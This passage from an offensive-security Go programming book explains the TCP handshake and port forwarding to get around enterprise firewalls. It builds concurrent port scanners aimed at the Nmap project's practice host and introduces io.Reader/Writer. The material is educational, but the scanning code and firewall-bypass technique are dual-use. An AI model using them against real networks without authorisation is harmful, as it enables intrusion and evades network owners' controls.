<html><head></head><body><div id="sbo-rt-content"><h2 class="h2" id="ch2"><span epub:type="pagebreak" id="page_21"/><span class="big">2</span><br/>TCP, SCANNERS, AND PROXIES</h2>&#13;
<div class="imagel"><img src="Images/common.jpg" alt="Image" width="190" height="190"/></div>&#13;
<p class="snoindent">Let’s begin our practical application of Go with the <em>Transmission Control Protocol (TCP)</em>, the predominant standard for connection-oriented, reliable communications and the foundation of modern networking. TCP is everywhere, and it has well-documented libraries, code samples, and generally easy-to-understand packet flows. You must understand TCP to fully evaluate, analyze, query, and manipulate network traffic.</p>&#13;
<p class="indent">As an attacker, you should understand how TCP works and be able to develop usable TCP constructs so that you can identify open/closed ports, recognize potentially errant results such as false-positives—for example, syn-flood protections—and bypass egress restrictions through port forwarding. In this chapter, you’ll learn basic TCP communications in Go; build a concurrent, properly throttled port scanner; create a TCP proxy that can be used for port forwarding; and re-create Netcat’s “gaping security hole” feature.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_22"/>Entire textbooks have been written to discuss every nuance of TCP, including packet structure and flow, reliability, communication reassembly, and more. This level of detail is beyond the scope of this book. For more details, you should read <em>The TCP/IP Guide</em> by Charles M. Kozierok (No Starch Press, 2005).</p>&#13;
<h3 class="h3" id="ch2lev1sec1">Understanding the TCP Handshake</h3>&#13;
<p class="noindent">For those who need a refresher, let’s review the basics. <a href="ch02.xhtml#ch2fig1">Figure 2-1</a> shows how TCP uses a handshake process when querying a port to determine whether the port is open, closed, or filtered.</p>&#13;
<div class="image"><img src="Images/02fig01.jpg" alt="Image" width="577" height="797"/></div>&#13;
<p class="figcap" id="ch2fig1"><em>Figure 2-1: TCP handshake fundamentals</em></p>&#13;
<p class="indent">If the port is open, a three-way handshake takes place. First, the client sends a <em>syn packet</em>, which signals the beginning of a communication. The server then responds with a <em>syn-ack</em>, or acknowledgment of the syn packet it received, prompting the client to finish with an <em>ack</em>, or acknowledgment of the server’s response. The transfer of data can then occur. If the port is closed, the server responds with a <em>rst</em> packet instead of a syn-ack. If the traffic is being filtered by a firewall, the client will typically receive no response from the server.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_23"/>These responses are important to understand when writing network-based tools. Correlating the output of your tools to these low-level packet flows will help you validate that you’ve properly established a network connection and troubleshoot potential problems. As you’ll see later in this chapter, you can easily introduce bugs into your code if you fail to allow full client-server TCP connection handshakes to complete, resulting in inaccurate or misleading results.</p>&#13;
<h3 class="h3" id="ch2lev1sec2">Bypassing Firewalls with Port Forwarding</h3>&#13;
<p class="noindent">People can configure firewalls to prevent a client from connecting to certain servers and ports, while allowing access to others. In some cases, you can circumvent these restrictions by using an intermediary system to proxy the connection around or through a firewall, a technique known as <em>port forwarding</em>.</p>&#13;
<p class="indent">Many enterprise networks restrict internal assets from establishing HTTP connections to malicious sites. For this example, imagine a nefarious site called <em>evil.com</em>. If an employee attempts to browse <em>evil.com</em> directly, a firewall blocks the request. However, should an employee own an external system that’s allowed through the firewall (for example, <em><a href="http://stacktitan.com">stacktitan.com</a></em>), that employee can leverage the allowed domain to bounce connections to <em>evil.com</em>. <a href="ch02.xhtml#ch2fig2">Figure 2-2</a> illustrates this concept.</p>&#13;
<div class="image"><img src="Images/02fig02.jpg" alt="Image" width="1045" height="169"/></div>&#13;
<p class="figcap" id="ch2fig2"><em>Figure 2-1: A TCP proxy</em></p>&#13;
<p class="indent">A client connects, through a firewall, to the destination host <em><a href="http://stacktitan.com">stacktitan.com</a></em>. This host is configured to forward connections to the host <em>evil.com</em>. While a firewall forbids direct connections to <em>evil.com</em>, a configuration such as the one shown here could allow a client to circumvent this protection mechanism and access <em>evil.com</em>.</p>&#13;
<p class="indent">You can use port forwarding to exploit several restrictive network configurations. For example, you could forward traffic through a jump box to access a segmented network or access ports bound to restrictive interfaces.</p>&#13;
<h3 class="h3" id="ch2lev1sec3">Writing a TCP Scanner</h3>&#13;
<p class="noindent">One effective way to conceptualize the interaction of TCP ports is by implementing a port scanner. By writing one, you’ll observe the steps that occur in a TCP handshake, along with the effects of encountered state changes, which allow you to determine whether a TCP port is available or whether it responds with a closed or filtered state.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_24"/>Once you’ve written a basic scanner, you’ll write one that’s faster. A port scanner may scan several ports by using a single contiguous method; however, this can become time-consuming when your goal is to scan all 65,535 ports. You’ll explore how to use concurrency to make an inefficient port scanner more suitable for larger port-scanning tasks.</p>&#13;
<p class="indent">You’ll also be able to apply the concurrency patterns that you’ll learn in this section in many other scenarios, both in this book and beyond.</p>&#13;
<h4 class="h4" id="ch2lev2sec1">Testing for Port Availability</h4>&#13;
<p class="noindent">The first step in creating the port scanner is understanding how to initiate a connection from a client to a server. Throughout this example, you’ll be connecting to and scanning <em><a href="http://scanme.nmap.org">scanme.nmap.org</a></em>, a service run by the Nmap project.<sup><a id="rch2fn1" href="footnote.xhtml#ch2fn1">1</a></sup> To do this, you’ll use Go’s <code>net</code> package: <code>net.Dial(</code><span class="codeitalic">network</span><code>,</code> <span class="codeitalic">address string</span><code>)</code>.</p>&#13;
<p class="indent">The first argument is a string that identifies the kind of connection to initiate. This is because <code>Dial</code> isn’t just for TCP; it can be used for creating connections that use Unix sockets, UDP, and Layer 4 protocols that exist only in your head (the authors have been down this road, and suffice it to say, TCP is very good). There are a few strings you can provide, but for the sake of brevity, you’ll use the string <code>tcp</code>.</p>&#13;
<p class="indent">The second argument tells <code>Dial(</code><span class="codeitalic">network</span><code>,</code> <span class="codeitalic">address string</span><code>)</code> the host to which you wish to connect. Notice it’s a single string, not a <code>string</code> and an <code>int</code>. For IPv4/TCP connections, this string will take the form of <code>host:port</code>. For example, if you wanted to connect to <em><a href="http://scanme.nmap.org">scanme.nmap.org</a></em> on TCP port 80, you would supply <code>scanme.nmap.org:80</code>.</p>&#13;
<p class="indent">Now you know how to create a connection, but how will you know if the connection is successful? You’ll do this through error checking: <code>Dial(</code><span class="codeitalic">network</span><code>,</code> <span class="codeitalic">address string</span><code>)</code> returns <code>Conn</code> and <code>error</code>, and <code>error</code> will be <code>nil</code> if the connection is successful. So, to verify your connection, you just check whether <code>error</code> equals <code>nil</code>.</p>&#13;
<p class="indent">You now have all the pieces needed to build a single port scanner, albeit an impolite one. <a href="ch02.xhtml#ch2list1">Listing 2-1</a> shows how to put it together. (All the code listings at the root location of / exist under the provided github repo <em><a href="https://github.com/blackhat-go/bhg/">https://github.com/blackhat-go/bhg/</a></em>.)</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "fmt"&#13;
    "net"&#13;
)&#13;
&#13;
func main() {&#13;
    _, err := net.Dial("tcp", "scanme.nmap.org:80")&#13;
<span epub:type="pagebreak" id="page_25"/>     if err == nil {&#13;
        fmt.Println("Connection successful")&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch2list1"><em>Listing 2-1: A basic port scanner that scans only one port (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-2/dial/main.go">/ch-2/dial/main.go</a><em>)</em></p>&#13;
<p class="indent">Run this code. You should see <code>Connection successful</code>, provided you have access to the great information superhighway.</p>&#13;
<h4 class="h4" id="ch2lev2sec2">Performing Nonconcurrent Scanning</h4>&#13;
<p class="noindent">Scanning a single port at a time isn’t useful, and it certainly isn’t efficient. TCP ports range from 1 to 65535; but for testing, let’s scan ports 1 to 1024. To do this, you can use a <code>for</code> loop:</p>&#13;
<pre>for i:=1; i &lt;= 1024; i++ {&#13;
}</pre>&#13;
<p class="indent">Now you have an <code>int</code>, but remember, you need a string as the second argument to <code>Dial(</code><span class="codeitalic">network</span><code>,</code> <span class="codeitalic">address string</span><code>)</code>. There are at least two ways to convert the integer into a string. One way is to use the string conversion package, <code>strconv</code>. The other way is to use <code>Sprintf(</code><span class="codeitalic">format string</span>, <span class="codeitalic">a ...interface</span><code>{}</code><code>)</code> from the <code>fmt</code> package, which (similar to its C sibling) returns a <code>string</code> generated from a format string.</p>&#13;
<p class="indent">Create a new file with the code in <a href="ch02.xhtml#ch2list2">Listing 2-2</a> and ensure that both your loop and string generation work. Running this code should print 1024 lines, but don’t feel obligated to count them.</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "fmt"&#13;
)&#13;
&#13;
func main() {&#13;
    for i := 1; i &lt;= 1024; i++ {&#13;
        address := fmt.Sprintf("scanme.nmap.org:%d", i)&#13;
        fmt.Println(address)&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch2list2"><em>Listing 2-2: Scanning 1024 ports of <a href="http://scanme.nmap.org">scanme.nmap.org</a> (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-2/tcp-scanner-slow/main.go">/ch-2/tcp-scanner-slow/main.go</a><em>)</em></p>&#13;
<p class="indent">All that’s left is to plug the address variable from the previous code example into <code>Dial(</code><span class="codeitalic">network</span><code>,</code> <span class="codeitalic">address string</span><code>)</code>, and implement the same error checking from the previous section to test port availability. You should also add some logic to close the connection if it was successful; that way, connections aren’t left open. <em>FINishing</em> your connections is just polite. To do that, you’ll call <code>Close()</code> on <code>Conn</code>. <a href="ch02.xhtml#ch2list3">Listing 2-3</a> shows the completed port scanner.</p>&#13;
<pre><span epub:type="pagebreak" id="page_26"/><span class="gray">package main</span>&#13;
&#13;
<span class="gray">import (</span>&#13;
    <span class="gray">"fmt"</span>&#13;
    "net"&#13;
<span class="gray">)</span>&#13;
&#13;
<span class="gray">func main() {</span>&#13;
    <span class="gray">for i := 1; i &lt;= 1024; i++ {</span>&#13;
        address := fmt.Sprintf("scanme.nmap.org:%d", i)&#13;
        conn, err := net.Dial("tcp", address)&#13;
        if err != nil {&#13;
            // port is closed or filtered.&#13;
            continue&#13;
        }&#13;
        conn.Close()&#13;
        fmt.Printf("%d open\n", i)&#13;
    <span class="gray">}</span>&#13;
<span class="gray">}</span></pre>&#13;
<p class="caption" id="ch2list3"><em>Listing 2-3: The completed port scanner (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-2/tcp-scanner-slow/main.go">/ch-2/tcp-scanner-slow/main.go</a><em>)</em></p>&#13;
<p class="indent">Compile and execute this code to conduct a light scan against the target. You should see a couple of open ports.</p>&#13;
<h4 class="h4" id="ch2lev2sec3">Performing Concurrent Scanning</h4>&#13;
<p class="noindent">The previous scanner scanned multiple ports in a single go (pun intended). But your goal now is to scan multiple ports concurrently, which will make your port scanner faster. To do this, you’ll harness the power of goroutines. Go will let you create as many goroutines as your system can handle, bound only by available memory.</p>&#13;
<h5 class="h5">The “Too Fast” Scanner Version</h5>&#13;
<p class="noindent">The most naive way to create a port scanner that runs concurrently is to wrap the call to <code>Dial(</code><span class="codeitalic">network</span><code>,</code> <span class="codeitalic">address string</span><code>)</code> in a goroutine. In the interest of learning from natural consequences, create a new file called <em>scan-too-fast.go</em> with the code in <a href="ch02.xhtml#ch2list4">Listing 2-4</a> and execute it.</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "fmt"&#13;
    "net"&#13;
)&#13;
&#13;
func main() {&#13;
    for i := 1; i &lt;= 1024; i++ {&#13;
        go func(j int) {&#13;
            address := fmt.Sprintf("scanme.nmap.org:%d", j)&#13;
            conn, err := net.Dial("tcp", address)&#13;
<span epub:type="pagebreak" id="page_27"/>            if err != nil {&#13;
                return&#13;
            }&#13;
            conn.Close()&#13;
            fmt.Printf("%d open\n", j)&#13;
        }(i)&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch2list4"><em>Listing 2-4: A scanner that works too fast (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-2/tcp-scanner-too-fast/main.go">/ch-2/tcp-scanner-too-fast/main.go</a><em>)</em></p>&#13;
<p class="indent">Upon running this code, you should observe the program exiting almost immediately:</p>&#13;
<pre>$ <span class="codestrong1">time ./tcp-scanner-too-fast</span>&#13;
./tcp-scanner-too-fast  0.00s user 0.00s system 90% cpu 0.004 total</pre>&#13;
<p class="indent">The code you just ran launches a single goroutine per connection, and the main goroutine doesn’t know to wait for the connection to take place. Therefore, the code completes and exits as soon as the <code>for</code> loop finishes its iterations, which may be faster than the network exchange of packets between your code and the target ports. You may not get accurate results for ports whose packets were still in-flight.</p>&#13;
<p class="indent">There are a few ways to fix this. One is to use <code>WaitGroup</code> from the <code>sync</code> package, which is a thread-safe way to control concurrency. <code>WaitGroup</code> is a struct type and can be created like so:</p>&#13;
<pre>var wg sync.WaitGroup</pre>&#13;
<p class="indent">Once you’ve created <code>WaitGroup</code>, you can call a few methods on the struct. The first is <code>Add(</code><span class="codeitalic">int</span><code>)</code>, which increases an internal counter by the number provided. Next, <code>Done()</code> decrements the counter by one. Finally, <code>Wait()</code> blocks the execution of the goroutine in which it’s called, and will not allow further execution until the internal counter reaches zero. You can combine these calls to ensure that the main goroutine waits for all connections to finish.</p>&#13;
<h5 class="h5">Synchronized Scanning Using WaitGroup</h5>&#13;
<p class="noindent"><a href="ch02.xhtml#ch2list5">Listing 2-5</a> shows the same port-scanning program with a different implementation of the goroutines.</p>&#13;
<pre><span class="gray">package main</span>&#13;
&#13;
<span class="gray">import (</span>&#13;
    <span class="gray">"fmt"</span>&#13;
    <span class="gray">"net"</span>&#13;
    "sync"&#13;
<span class="gray">)</span>&#13;
<span epub:type="pagebreak" id="page_28"/><span class="gray">func main() {</span>&#13;
 <span class="ent">❶</span> var wg sync.WaitGroup&#13;
    <span class="gray">for i := 1; i &lt;= 1024; i++ {</span>&#13;
     <span class="ent">❷</span> wg.Add(1)&#13;
        <span class="gray">go func(j int) {</span>&#13;
         <span class="ent">❸</span> defer wg.Done()&#13;
            <span class="gray">address := fmt.Sprintf("scanme.nmap.org:%d", j)</span>&#13;
            <span class="gray">conn, err := net.Dial("tcp", address)</span>&#13;
            <span class="gray">if err != nil {</span>&#13;
                <span class="gray">return</span>&#13;
            <span class="gray">}</span>&#13;
            <span class="gray">conn.Close()</span>&#13;
            <span class="gray">fmt.Printf("%d open\n", j)</span>&#13;
        <span class="gray">}(i)</span>&#13;
    <span class="gray">}</span>&#13;
 <span class="ent">❹</span> wg.Wait()&#13;
<span class="gray">}</span></pre>&#13;
<p class="caption" id="ch2list5"><em>Listing 2-5: A synchronized scanner that uses <code>WaitGroup</code> (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-2/tcp-scanner-wg-too-fast/main.go">/ch-2/tcp-scanner-wg-too-fast/main.go</a><em>)</em></p>&#13;
<p class="indent">This iteration of the code remains largely identical to our initial version. However, you’ve added code that explicitly tracks the remaining work. In this version of the program, you create <code>sync.WaitGroup</code> <span class="ent">❶</span>, which acts as a synchronized counter. You increment this counter via <code>wg.Add(1)</code> each time you create a goroutine to scan a port <span class="ent">❷</span>, and a deferred call to <code>wg.Done()</code> decrements the counter whenever one unit of work has been performed <span class="ent">❸</span>. Your <code>main()</code> function calls <code>wg.Wait()</code>, which blocks until all the work has been done and your counter has returned to zero <span class="ent">❹</span>.</p>&#13;
<p class="indent">This version of the program is better, but still incorrect. If you run this multiple times against multiple hosts, you might see inconsistent results. Scanning an excessive number of hosts or ports simultaneously may cause network or system limitations to skew your results. Go ahead and change <code>1024</code> to <span class="codestrong1">65535</span>, and the destination server to your localhost <span class="codestrong1">127.0.0.1</span> in your code. If you want, you can use Wireshark or tcpdump to see how fast those connections are opened.</p>&#13;
<h5 class="h5">Port Scanning Using a Worker Pool</h5>&#13;
<p class="noindent">To avoid inconsistencies, you’ll use a pool of goroutines to manage the concurrent work being performed. Using a <code>for</code> loop, you’ll create a certain number of worker goroutines as a resource pool. Then, in your <code>main()</code> “thread,” you’ll use a channel to provide work.</p>&#13;
<p class="indent">To start, create a new program that has 100 workers, consumes a channel of <code>int</code>, and prints them to the screen. You’ll still use <code>WaitGroup</code> to block execution. Create your initial code stub for a <code>main</code> function. Above it, write the function shown in <a href="ch02.xhtml#ch2list6">Listing 2-6</a>.</p>&#13;
<pre><span epub:type="pagebreak" id="page_29"/>func worker(ports chan int, wg *sync.WaitGroup) {&#13;
    for p := range ports {&#13;
        fmt.Println(p)&#13;
        wg.Done()&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch2list6"><em>Listing 2-6: A worker function for processing work</em></p>&#13;
<p class="indent">The <code>worker(int, *sync.WaitGroup)</code> function takes two arguments: a channel of type <code>int</code> and a pointer to a <code>WaitGroup</code>. The channel will be used to receive work, and the <code>WaitGroup</code> will be used to track when a single work item has been completed.</p>&#13;
<p class="indent">Now, add your <code>main()</code> function shown in <a href="ch02.xhtml#ch2list7">Listing 2-7</a>, which will manage the workload and provide work to your <code>worker(int, *sync.WaitGroup)</code> function.</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "fmt"&#13;
    "sync"&#13;
)&#13;
&#13;
func worker(ports chan int, wg *sync.WaitGroup) {&#13;
 <span class="ent">❶</span> for p := range ports {&#13;
        fmt.Println(p)&#13;
        wg.Done()&#13;
    }&#13;
}&#13;
&#13;
func main() {&#13;
    ports := make<span class="ent">❷</span>(chan int, 100)&#13;
    var wg sync.WaitGroup&#13;
 <span class="ent">❸</span> for i := 0; i &lt; cap(ports); i++ {&#13;
        go worker(ports, &amp;wg)&#13;
    }&#13;
    for i := 1; i &lt;= 1024; i++ {&#13;
        wg.Add(1)&#13;
     <span class="ent">❹</span> ports &lt;- i&#13;
    }&#13;
    wg.Wait()&#13;
 <span class="ent">❺</span> close(ports)&#13;
}</pre>&#13;
<p class="caption" id="ch2list7"><em>Listing 2-7: A basic worker pool (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-2/tcp-sync-scanner/main.go">/ch-2/tcp-sync-scanner/main.go</a><em>)</em></p>&#13;
<p class="indent">First, you create a channel by using <code>make()</code> <span class="ent">❷</span>. A second parameter, an <code>int</code> value of <code>100</code>, is provided to <code>make()</code> here. This allows the channel to be <em>buffered</em>, which means you can send it an item without waiting for a receiver to read the item. Buffered channels are ideal for maintaining and tracking work for multiple producers and consumers. You’ve capped the channel at 100, meaning it can hold 100 items before the sender will block. <span epub:type="pagebreak" id="page_30"/>This is a slight performance increase, as it will allow all the workers to start immediately.</p>&#13;
<p class="indent">Next, you use a <code>for</code> loop <span class="ent">❸</span> to start the desired number of workers—in this case, 100. In the <code>worker(int, *sync.WaitGroup)</code> function, you use <code>range</code> <span class="ent">❶</span> to continuously receive from the <code>ports</code> channel, looping until the channel is closed. Notice that you aren’t doing any work yet in the worker—that’ll come shortly. Iterating over the ports sequentially in the <code>main()</code> function, you send a port on the <code>ports</code> channel <span class="ent">❹</span> to the worker. After all the work has been completed, you close the channel <span class="ent">❺</span>.</p>&#13;
<p class="indent">Once you build and execute this program, you’ll see your numbers printed to the screen. You might notice something interesting here: the numbers are printed in no particular order. Welcome to the wonderful world of parallelism.</p>&#13;
<h5 class="h5">Multichannel Communication</h5>&#13;
<p class="noindent">To complete the port scanner, you could plug in your code from earlier in the section, and it would work just fine. However, the printed ports would be unsorted, because the scanner wouldn’t check them in order. To solve this problem, you need to use a separate thread to pass the result of the port scan back to your main thread to order the ports before printing. Another benefit of this modification is that you can remove the dependency of a <code>WaitGroup</code> entirely, as you’ll have another method of tracking completion. For example, if you scan 1024 ports, you’re sending on the worker channel 1024 times, and you’ll need to send the result of that work back to the main thread 1024 times. Because the number of work units sent and the number of results received are the same, your program can know when to close the channels and subsequently shut down the workers.</p>&#13;
<p class="indent">This modification is demonstrated in <a href="ch02.xhtml#ch2list8">Listing 2-8</a>, which completes the port scanner.</p>&#13;
<pre>   <span class="gray">package main</span>&#13;
&#13;
   <span class="gray">import (</span>&#13;
       <span class="gray">"fmt"</span>&#13;
       "net"&#13;
       "sort"&#13;
   <span class="gray">)</span>&#13;
&#13;
<span class="ent">❶</span> func worker(ports, results chan int) {&#13;
       <span class="gray">for p := range ports {</span>&#13;
           address := fmt.Sprintf("scanme.nmap.org:%d", p)&#13;
           conn, err := net.Dial("tcp", address)&#13;
           if err != nil {&#13;
            <span class="ent">❷</span> results &lt;- 0&#13;
               continue&#13;
           }&#13;
           conn.Close()&#13;
        <span class="ent">❸</span> results &lt;- p&#13;
       }&#13;
   }&#13;
   <span epub:type="pagebreak" id="page_31"/><span class="gray">func main() {</span>&#13;
       <span class="gray">ports := make(chan int, 100)</span>&#13;
    <span class="ent">❹</span> results := make(chan int)&#13;
    <span class="ent">❺</span> var openports []int&#13;
&#13;
       for i := 0; i &lt; cap(ports); i++ {&#13;
           go worker(ports, results)&#13;
       }&#13;
&#13;
    <span class="ent">❻</span> go func() {&#13;
          for i := 1; i &lt;= 1024; i++ {&#13;
              ports &lt;- i&#13;
           }&#13;
       }()&#13;
&#13;
    <span class="ent">❼</span> for i := 0; i &lt; 1024; i++ {&#13;
           port := &lt;-results&#13;
           if port != 0 {&#13;
               openports = append(openports, port)&#13;
           }&#13;
       }&#13;
&#13;
       close(ports)&#13;
       close(results)&#13;
    <span class="ent">❽</span> sort.Ints(openports)&#13;
       for _, port := range openports {&#13;
           fmt.Printf("%d open\n", port)&#13;
    }&#13;
<span class="gray">}</span></pre>&#13;
<p class="caption" id="ch2list8"><em>Listing 2-8: Port scanning with multiple channels (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-2/tcp-scanner-final/main.go">/ch-2/tcp-scanner-final/main.go</a><em>)</em></p>&#13;
<p class="indent">The <code>worker(ports, results chan int)</code> function has been modified to accept two channels <span class="ent">❶</span>; the remaining logic is mostly the same, except that if the port is closed, you’ll send a zero <span class="ent">❷</span>, and if it’s open, you’ll send the port <span class="ent">❸</span>. Also, you create a separate channel to communicate the results from the worker to the main thread <span class="ent">❹</span>. You then use a slice <span class="ent">❺</span> to store the results so you can sort them later. Next, you need to send to the workers in a separate goroutine <span class="ent">❻</span> because the result-gathering loop needs to start before more than 100 items of work can continue.</p>&#13;
<p class="indent">The result-gathering loop <span class="ent">❼</span> receives on the <code>results</code> channel 1024 times. If the port doesn’t equal 0, it’s appended to the slice. After closing the channels, you’ll use <code>sort</code> <span class="ent">❽</span> to sort the slice of open ports. All that’s left is to loop over the slice and print the open ports to screen.</p>&#13;
<p class="indent">There you have it: a highly efficient port scanner. Take some time to play around with the code—specifically, the number of workers. The higher the count, the faster your program should execute. But if you add too many workers, your results could become unreliable. When you’re writing tools for others to use, you’ll want to use a healthy default value that caters to reliability over speed. However, you should also allow users to provide the number of workers as an option.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_32"/>You could make a couple of improvements to this program. First, you’re sending on the <code>results</code> channel for every port scanned, and this isn’t necessary. The alternative requires code that is slightly more complex as it uses an additional channel not only to track the workers, but also to prevent a race condition by ensuring the completion of all gathered results. As this is an introductory chapter, we purposefully left this out; but don’t worry! We’ll introduce this pattern in <a href="ch03.xhtml#ch3">Chapter 3</a>. Second, you might want your scanner to be able to parse port-strings—for example, <code>80,443,8080,21-25</code>, like those that can be passed to Nmap. If you want to see an implementation of this, see <a href="https://github.com/blackhat-go/bhg/blob/master/ch-2/scanner-port-format/"><em>https://github.com/blackhat-go/bhg/blob/master/ch-2/scanner-port-format/</em></a>. We’ll leave this as an exercise for you to explore.</p>&#13;
<h3 class="h3" id="ch2lev1sec4">Building a TCP Proxy</h3>&#13;
<p class="noindent">You can achieve all TCP-based communications by using Go’s built-in <code>net</code> package. The previous section focused primarily on using the <code>net</code> package from a client’s perspective, and this section will use it to create TCP servers and transfer data. You’ll begin this journey by building the requisite <em>echo server</em>—a server that merely echoes a given response back to a client—followed by two much more generally applicable programs: a TCP port forwarder and a re-creation of Netcat’s “gaping security hole” for remote command execution.</p>&#13;
<h4 class="h4" id="ch2lev2sec4">Using io.Reader and io.Writer</h4>&#13;
<p class="noindent">To create the examples in this section, you need to use two significant types that are crucial to essentially all input/output (I/O) tasks, whether you’re using TCP, HTTP, a filesystem, or any other means: <code>io.Reader</code> and <code>io.Writer</code>. Part of Go’s built-in <code>io</code> package, these types act as the cornerstone to any data transmission, local or networked. These types are defined in Go’s documentation as follows:</p>&#13;
<pre>type Reader interface {&#13;
    Read(p []byte) (n int, err error)&#13;
}&#13;
type Writer interface {&#13;
    Write(p []byte) (n int, err error)&#13;
}</pre>&#13;
<p class="indent">Both types are defined as interfaces, meaning they can’t be directly instantiated. Each type contains the definition of a single exported function: <code>Read</code> or <code>Write</code>. As explained in <a href="ch01.xhtml#ch1">Chapter 1</a>, you can think of these functions as abstract methods that must be implemented on a type for it to be considered a <code>Reader</code> or <code>Writer</code>. For example, the following contrived type fulfills this contract and can be used anywhere a <code>Reader</code> is accepted:</p>&#13;
<pre>type FooReader struct {}&#13;
func (fooReader *FooReader) Read(p []byte) (int, error) {&#13;
    // Read some data from somewhere, anywhere.&#13;
<span epub:type="pagebreak" id="page_33"/>    return len(dataReadFromSomewhere), nil&#13;
}</pre>&#13;
<p class="indent">This same idea applies to the <code>Writer</code> interface:</p>&#13;
<pre>type FooWriter struct {}&#13;
func (fooWriter *FooWriter) Write(p []byte) (int, error) {&#13;
    // Write data somewhere.&#13;
    return len(dataWrittenSomewhere), nil&#13;
}</pre>&#13;
<p class="indent">Let’s take this knowledge and create something semi-usable: a custom <code>Reader</code> and <code>Writer</code> that wraps stdin and stdout. The code for this is a little contrived since Go’s <code>os.Stdin</code> and <code>os.Stdout</code> types already act as <code>Reader</code> and <code>Writer</code>, but then you wouldn’t learn anything if you didn’t reinvent the wheel every now and again, would you?</p>&#13;
<p class="indent"><a href="ch02.xhtml#ch2list9">Listing 2-9</a> shows a full implementation, and an explanation follows.</p>&#13;
<pre>   package main&#13;
&#13;
   import (&#13;
       "fmt"&#13;
       "log"&#13;
       "os"&#13;
   )&#13;
&#13;
   // FooReader defines an io.Reader to read from stdin.&#13;
<span class="ent">❶</span> type FooReader struct{}&#13;
&#13;
   // Read reads data from stdin.&#13;
<span class="ent">❷</span> func (fooReader *FooReader) Read(b []byte) (int, error) {&#13;
       fmt.Print("in &gt; ")&#13;
       return os.Stdin.Read(b)<span class="ent">❸</span>&#13;
   }&#13;
&#13;
   // FooWriter defines an io.Writer to write to Stdout.&#13;
<span class="ent">❹</span> type FooWriter struct{}&#13;
&#13;
   // Write writes data to Stdout.&#13;
<span class="ent">❺</span> func (fooWriter *FooWriter) Write(b []byte) (int, error) {&#13;
       fmt.Print("out&gt; ")&#13;
       return os.Stdout.Write(b)<span class="ent">❻</span>&#13;
   }&#13;
&#13;
   func main() {&#13;
       // Instantiate reader and writer.&#13;
       var (&#13;
           reader FooReader&#13;
           writer FooWriter&#13;
       )&#13;
&#13;
       // Create buffer to hold input/output.&#13;
    <span class="ent">❼</span> input := make([]byte, 4096)&#13;
<span epub:type="pagebreak" id="page_34"/>&#13;
       // Use reader to read input.&#13;
       s, err := reader.Read(input)<span class="ent">❽</span>&#13;
       if err != nil {&#13;
           log.Fatalln("Unable to read data")&#13;
       }&#13;
       fmt.Printf("Read %d bytes from stdin\n", s)&#13;
&#13;
       // Use writer to write output.&#13;
       s, err = writer.Write(input)<span class="ent">❾</span>&#13;
       if err != nil {&#13;
           log.Fatalln("Unable to write data")&#13;
       }&#13;
       fmt.Printf("Wrote %d bytes to stdout\n", s)&#13;
}</pre>&#13;
<p class="caption" id="ch2list9"><em>Listing 2-9: A <code>reader</code> and <code>writer</code> demonstration (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-2/io-example/main.go">/ch-2/io-example/main.go</a><em>)</em></p>&#13;
<p class="indent">The code defines two custom types: <code>FooReader</code> <span class="ent">❶</span> and <code>FooWriter</code> <span class="ent">❹</span>. On each type, you define a concrete implementation of the <code>Read([]byte)</code> function <span class="ent">❷</span> for <code>FooReader</code> and the <code>Write([]byte)</code> function <span class="ent">❺</span> for <code>FooWriter</code>. In this case, both functions are reading from stdin <span class="ent">❸</span> and writing to stdout <span class="ent">❻</span>.</p>&#13;
<p class="indent">Note that the <code>Read</code> functions on both <code>FooReader</code> and <code>os.Stdin</code> return the length of data and any errors. The data itself is copied into the <code>byte</code> slice passed to the function. This is consistent with the <code>Reader</code> interface prototype definition provided earlier in this section. The <code>main()</code> function creates that slice (named <code>input</code>) <span class="ent">❼</span> and then proceeds to use it in calls to <code>FooReader.Read([]byte</code><code>)</code> <span class="ent">❽</span> and <code>FooReader.Write([]byte)</code> <span class="ent">❾</span>.</p>&#13;
<p class="indent">A sample run of the program produces the following:</p>&#13;
<pre>$ <span class="codestrong1">go run main.go</span>&#13;
in &gt; <span class="codestrong1">hello world!!!</span>&#13;
Read 15 bytes from stdin&#13;
out&gt; <span class="codestrong1">hello world!!!</span>&#13;
Wrote 4096 bytes to stdout</pre>&#13;
<p class="indent">Copying data from a <code>Reader</code> to a <code>Writer</code> is a fairly common pattern—so much so that Go’s <code>io</code> package contains a <code>Copy()</code> function that can be used to simplify the <code>main()</code> function. The function prototype is as follows:</p>&#13;
<pre>func Copy(dst io.Writer, src io.Reader) (written int64, error)</pre>&#13;
<p class="indent">This convenience function allows you to achieve the same programmatic behavior as before, replacing your <code>main()</code> function with the code in <a href="ch02.xhtml#ch2list10">Listing 2-10</a>.</p>&#13;
<pre>func main() {&#13;
    var (&#13;
        reader FooReader&#13;
        writer FooWriter&#13;
    )&#13;
<span epub:type="pagebreak" id="page_35"/>    if _, err := io.Copy(&amp;writer, &amp;reader)<span class="ent">❶</span>; err != nil {&#13;
        log.Fatalln("Unable to read/write data")&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch2list10"><em>Listing 2-10: Using <span class="codeitalic">io.Copy</span> (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-2/copy-example/main.go">/ch-2/copy-example/main.go</a><em>)</em></p>&#13;
